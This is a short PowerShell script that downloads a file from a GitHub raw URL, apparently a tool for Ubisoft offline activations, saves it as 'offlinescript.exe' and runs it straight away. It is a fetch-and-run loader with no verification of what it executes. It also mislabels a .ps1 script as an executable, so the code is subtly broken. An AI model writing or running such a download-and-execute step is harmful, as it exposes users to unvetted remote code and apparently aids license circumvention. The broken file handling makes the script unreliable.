$url = "https://raw.githubusercontent.com/darrenphilip/Script-For-Ubisoft-Offline-Activations/main/script.ps1"
$output = "offlinescript.exe"

# Download the executable
Invoke-WebRequest -Uri $url -OutFile $output

# Run the executable
Start-Process -FilePath $output -NoNewWindow

